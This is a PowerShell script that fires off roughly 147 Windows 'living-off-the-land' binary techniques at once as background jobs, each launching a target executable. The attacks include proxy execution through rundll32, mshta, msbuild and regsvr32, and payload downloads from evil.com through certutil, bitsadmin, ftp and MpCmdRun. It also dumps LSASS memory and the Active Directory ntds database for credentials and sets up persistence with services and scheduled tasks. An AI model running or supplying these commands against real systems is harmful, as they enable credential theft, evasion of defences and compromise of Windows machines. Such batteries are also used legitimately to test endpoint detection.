# View running jobs
#Get-Job

# Check job output (non-destructive)
#Get-Job | Receive-Job -Keep

# View specific job
#Receive-Job -Id 5 -Keep

# Stop all jobs
#Get-Job | Stop-Job
#Get-Job | Remove-Job

# Export results
#Get-Job | Receive-Job | Out-File "$env:TEMP\lolbin_results.txt"



# LOLBIN Async Execution - All attacks run simultaneously
$target = "c:\autohotkey\AutoHotkey64.exe"
$tmp = "$env:TEMP"
$jobs = @()

# DLL Proxy Executions (1-8)
$jobs += Start-Job { rundll32.exe advpack.dll,LaunchINFSection "$using:tmp\test.inf",DefaultInstall_SingleUser,1, }
$jobs += Start-Job { rundll32.exe ieadvpack.dll,LaunchINFSection "$using:tmp\test.inf",DefaultInstall_SingleUser,1, }
$jobs += Start-Job { control.exe "$using:tmp\payload.cpl" }
$jobs += Start-Job { rundll32.exe pcwutl.dll,LaunchApplication "$using:target" }
$jobs += Start-Job { rundll32.exe shell32.dll,ShellExec_RunDLL "$using:target" }
$jobs += Start-Job { rundll32.exe url.dll,OpenURL "$using:target" }
$jobs += Start-Job { rundll32.exe zipfldr.dll,RouteTheCall "$using:target" }
$jobs += Start-Job { rundll32.exe comsvcs.dll,MiniDump (Get-Process lsass).Id "$using:tmp\dump.bin" full }

# Core Windows Utilities (9-15)
$jobs += Start-Job { wmic.exe process call create "$using:target" }
$jobs += Start-Job { "CreateObject(""WScript.Shell"").Run ""$using:target""" | Out-File "$using:tmp\run.vbs"; wscript.exe "$using:tmp\run.vbs" }
$jobs += Start-Job { WorkFolders.exe /c "$using:target" }
$jobs += Start-Job { wlrmdr.exe -s "$using:target" }
$jobs += Start-Job { msedge_proxy.exe --profile-directory=Default --app="$using:target" }
$jobs += Start-Job { msedgewebview2.exe --profile-directory=Default --app="$using:target" }

# Developer/Debugging Tools (16-30)
$jobs += Start-Job { adplus.exe -hang -pn "$using:target" -o "$using:tmp" }
$jobs += Start-Job { & AgentExecutor.exe -powershell "Start-Process '$using:target'" }
$jobs += Start-Job { & AppLauncher.exe "$using:target" }
$jobs += Start-Job { Appvlp.exe "$using:target" }
$jobs += Start-Job { createdump.exe -u -f "$using:tmp\dump" "$using:target" }
$jobs += Start-Job { dsdbutil.exe "ac i ntds" "ifm" "create full $using:tmp" q q }
$jobs += Start-Job { dtutil.exe /FILE "$using:target" /ENCRYPT FILE }
$jobs += Start-Job { & Dump64.exe "$using:target" }
$jobs += Start-Job { & DumpMinitool.exe "$using:target" }
$jobs += Start-Job { dxcap.exe -c "$using:target" }
$jobs += Start-Job { mftrace.exe -o "$using:tmp\trace.etl" -c "$using:target" }
$jobs += Start-Job { & "Microsoft.NodejsTools.PressAnyKey.exe" "$using:target" }
$jobs += Start-Job { msdeploy.exe -verb:sync -source:runCommand="$using:target" }
$jobs += Start-Job { "<xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:ms=""urn:schemas-microsoft-com:xslt""><xsl:template match=""/""><xsl:value-of select=""ms:process('$using:target')""/></xsl:template></xsl:stylesheet>" | Out-File "$using:tmp\exec.xsl"; msxsl.exe "$using:tmp\exec.xsl" "$using:tmp\exec.xsl" }
$jobs += Start-Job { ntdsutil.exe "ac i ntds" "ifm" "create full $using:tmp" q q }

# Additional Tools (31-45)
$jobs += Start-Job { & OpenConsole.exe "$using:target" }
$jobs += Start-Job { pixtool.exe "$using:target" }
$jobs += Start-Job { & ProtocolHandler.exe "$using:target" }
$jobs += Start-Job { & remote.exe /s "$using:target" }
$jobs += Start-Job { sqldumper.exe 1234 0 0x0 0 "$using:tmp" }
$jobs += Start-Job { Squirrel.exe --processStart "$using:target" }
$jobs += Start-Job { & TestWindowRemoteAgent.exe "$using:target" }
$jobs += Start-Job { Update.exe --processStart="$using:target" }
$jobs += Start-Job { VSDiagnostics.exe start 1234 /launch:"$using:target" }
$jobs += Start-Job { & VSIISExeLauncher.exe "$using:target" }
$jobs += Start-Job { & VSLaunchBrowser.exe "$using:target" }
$jobs += Start-Job { vshadow.exe -exec="$using:target" -script="$using:tmp\shadow.cmd" C: }
$jobs += Start-Job { vsjitdebugger.exe -p "$using:target" }
$jobs += Start-Job { & WFMFormat.exe "$using:target" }
$jobs += Start-Job { wsl.exe -e "$using:target" }

# WSL, Boot, System Tools (46-60)
$jobs += Start-Job { xbootmgr.exe -trace boot -prepSystem -verboseReadyBoot -postBootDelay 60 -stackwalk Profile -start "$using:target" }
$jobs += Start-Job { & XBootMgrSleep.exe "$using:target" }
$jobs += Start-Job { devtunnel.exe host -p 8080 --allow-anonymous "$using:target" }
$jobs += Start-Job { & winfile.exe "$using:target" }
$jobs += Start-Job { winget.exe install --manifest "$using:tmp\manifest.yaml" }
$jobs += Start-Job { cmd.exe /c "$using:target" }
$jobs += Start-Job { at.exe 23:00 "$using:target" }
$jobs += Start-Job { atbroker.exe /start "$using:target" }
$jobs += Start-Job { bash.exe -c "$using:target" }

# BITS, Certificates, Compilers (61-75)
$jobs += Start-Job { bitsadmin.exe /create job1; bitsadmin.exe /addfile job1 http://evil.com/payload "$using:target"; bitsadmin.exe /SetNotifyCmdLine job1 "$using:target" NULL; bitsadmin.exe /complete job1 }
$jobs += Start-Job { certoc.exe -LoadDLL "$using:target" }
$jobs += Start-Job { certreq.exe -Post -config "$using:target" }
$jobs += Start-Job { certutil.exe -urlcache -split -f http://evil.com/payload "$using:target"; & "$using:target" }
$jobs += Start-Job { cmdkey.exe /list }
$jobs += Start-Job { cmdl32.exe "$using:target" }
$jobs += Start-Job { cmstp.exe /s "$using:tmp\payload.inf" }
$jobs += Start-Job { colorcpl.exe "$using:target" }
$jobs += Start-Job { "using System;class P{static void Main(){System.Diagnostics.Process.Start(""$using:target"");}}" | Out-File "$using:tmp\payload.cs"; csc.exe /out:"$using:tmp\payload.exe" /target:exe "$using:tmp\payload.cs"; & "$using:tmp\payload.exe" }
$jobs += Start-Job { "CreateObject(""WScript.Shell"").Run ""$using:target""" | Out-File "$using:tmp\run2.vbs"; cscript.exe "$using:tmp\run2.vbs" }
$jobs += Start-Job { DataSvcUtil.exe /out:"$using:tmp\payload.cs" /uri:http://evil.com }
$jobs += Start-Job { desktopimgdownldr.exe /lockscreenurl:file:///$using:target /eventName:desktopimgdownldr }
$jobs += Start-Job { dfsvc.exe "$using:target" }
$jobs += Start-Job { diantz.exe "$using:target" "$using:tmp\payload.cab" }
$jobs += Start-Job { "exec $using:target" | Out-File "$using:tmp\diskshadow.txt"; diskshadow.exe /s "$using:tmp\diskshadow.txt" }

# Deployment and Disk Tools (76-90)
$jobs += Start-Job { dnscmd.exe /config /serverlevelplugindll "$using:target" }
$jobs += Start-Job { esentutl.exe /y "$using:target" /d "$using:tmp\out.exe" /o }
$jobs += Start-Job { expand.exe "$using:tmp\payload.cab" -F:* "$using:tmp" }
$jobs += Start-Job { explorer.exe "$using:target" }
$jobs += Start-Job { extexport.exe "$using:target" "$using:tmp\out.dll" }
$jobs += Start-Job { extrac32.exe /Y /C "$using:tmp\payload.cab" "$using:tmp" }
$jobs += Start-Job { findstr.exe /V /L W3AllLov3DonaldTrump "$using:target" > "$using:tmp\payload.exe"; & "$using:tmp\payload.exe" }
$jobs += Start-Job { finger.exe "user@$using:target" }
$jobs += Start-Job { fltmc.exe load "$using:target" }
$jobs += Start-Job { forfiles.exe /p c:\windows\system32 /m cmd.exe /c "$using:target" }
$jobs += Start-Job { "open evil.com`nuser anonymous pass`nget payload.exe $using:target`nbye" | Out-File "$using:tmp\ftp.txt"; ftp.exe -s:"$using:tmp\ftp.txt" }
$jobs += Start-Job { fvenotify.exe "$using:target" }
$jobs += Start-Job { gfxdownloadwrapper.exe "$using:target" }
$jobs += Start-Job { gpscript.exe /Startup }
$jobs += Start-Job { hh.exe "$using:target" }

# Graphics, Group Policy, Help (91-105)
$jobs += Start-Job { ie4uinit.exe -BaseSettings }
$jobs += Start-Job { ieexec.exe http://evil.com/payload.exe }
$jobs += Start-Job { ilasm.exe "$using:tmp\payload.il" /exe /output:"$using:target" }
$jobs += Start-Job { infdefaultinstall.exe "$using:tmp\payload.inf" }
$jobs += Start-Job { installutil.exe /logfile= /LogToConsole=false /U "$using:target" }
$jobs += Start-Job { jsc.exe "$using:tmp\payload.js" }
$jobs += Start-Job { ldifde.exe -i -f "$using:tmp\payload.ldf" }
$jobs += Start-Job { makecab.exe "$using:target" "$using:tmp\payload.cab" }
$jobs += Start-Job { mavinject.exe 1234 /INJECTRUNNING "$using:target" }
$jobs += Start-Job { mmc.exe -Embedding "$using:target" }
$jobs += Start-Job { MpCmdRun.exe -DownloadFile -url http://evil.com/payload -path "$using:target" }
$jobs += Start-Job { "<Project ToolsVersion=""4.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003""><Target Name=""Hello""><Exec Command=""$using:target""/></Target></Project>" | Out-File "$using:tmp\build.xml"; msbuild.exe "$using:tmp\build.xml" }
$jobs += Start-Job { msconfig.exe -5 }
$jobs += Start-Job { msdt.exe -path "$using:tmp" -cab "$using:tmp\payload.cab" }
$jobs += Start-Job { mshta.exe "vbscript:Execute(""CreateObject(""""WScript.Shell"""").Run """"$using:target"""":close"")" }

# System Configuration (106-120)
$jobs += Start-Job { msiexec.exe /quiet /i "$using:tmp\payload.msi" }
$jobs += Start-Job { netsh.exe add helper "$using:target" }
$jobs += Start-Job { odbcconf.exe /a "{REGSVR $using:target}" }
$jobs += Start-Job { & OfflineScannerShell.exe "$using:target" }
$jobs += Start-Job { pcalua.exe -a "$using:target" }
$jobs += Start-Job { pcwrun.exe "$using:target" }
$jobs += Start-Job { pktmon.exe start --etw -p "$using:target" }
$jobs += Start-Job { pnputil.exe /add-driver "$using:target" /install }
$jobs += Start-Job { presentationhost.exe "$using:target" }
$jobs += Start-Job { print.exe /D:"$using:target" "$using:tmp\payload.txt" }
$jobs += Start-Job { printbrm.exe -r -d "$using:tmp" -f "$using:target" }
$jobs += Start-Job { psr.exe /start /output "$using:tmp\recording.zip" /sc 1 /maxsc 1 /sketch 0 /gui 0 }
$jobs += Start-Job { rasautou.exe -d "$using:target" }
$jobs += Start-Job { rdrleakdiag.exe /p 1234 /o "$using:tmp" /fullmemdmp /wait 1 }
$jobs += Start-Job { reg.exe import "$using:tmp\payload.reg" }

# Registry and RAS Tools (121-135)
$jobs += Start-Job { regasm.exe /U "$using:target" }
$jobs += Start-Job { regedit.exe /s "$using:tmp\payload.reg" }
$jobs += Start-Job { regini.exe "$using:tmp\payload.ini" }
$jobs += Start-Job { & Register-cimprovider.exe -path "$using:target" }
$jobs += Start-Job { regsvcs.exe "$using:target" }
$jobs += Start-Job { regsvr32.exe /s /u /i:"$using:target" scrobj.dll }
$jobs += Start-Job { replace.exe "$using:target" "$env:windir\system32" }
$jobs += Start-Job { rpcping.exe -s "$using:target" }
$jobs += Start-Job { rundll32.exe "$using:target",EntryPoint }
$jobs += Start-Job { & runexehelper.exe "$using:target" }
$jobs += Start-Job { runonce.exe /AlternateShellStartup }
$jobs += Start-Job { runscripthelper.exe surfacecheck "$using:tmp\payload.xml" }
$jobs += Start-Job { sc.exe create evilsvc binPath= "$using:target"; sc.exe start evilsvc }
$jobs += Start-Job { schtasks.exe /create /tn evilTask /tr "$using:target" /sc once /st 23:00 /f; schtasks.exe /run /tn evilTask }
$jobs += Start-Job { scriptrunner.exe -appvscript "$using:target" }

# Services, Tasks, Final Tools (136-147)
$jobs += Start-Job { SyncAppvPublishingServer.exe "n;Start-Process $using:target" }
$jobs += Start-Job { ttdinject.exe /launch "$using:target" }
$jobs += Start-Job { tttracer.exe -out "$using:tmp" "$using:target" }
$jobs += Start-Job { unregmp2.exe /ShowWMP "$using:target" }
$jobs += Start-Job { verclsid.exe /S /C "{CLSID}" }
$jobs += Start-Job { wab.exe "$using:target" }
$jobs += Start-Job { wbadmin.exe start backup -backupTarget:"$using:tmp" -include:C: -quiet }
$jobs += Start-Job { wevtutil.exe qe Application /c:1 /f:text /rd:true }
$jobs += Start-Job { wlrmdr.exe -s "$using:target" }
$jobs += Start-Job { wuauclt.exe /UpdateDeploymentProvider "$using:tmp\payload.dll" /RunHandlerComServer }

Write-Host "[+] Launched $($jobs.Count) async LOLBIN attacks"
Write-Host "[*] Monitor with: Get-Job | Receive-Job -Keep"
Write-Host "[*] Check status: Get-Job"
Write-Host "[*] Stop all: Get-Job | Stop-Job; Get-Job | Remove-Job"
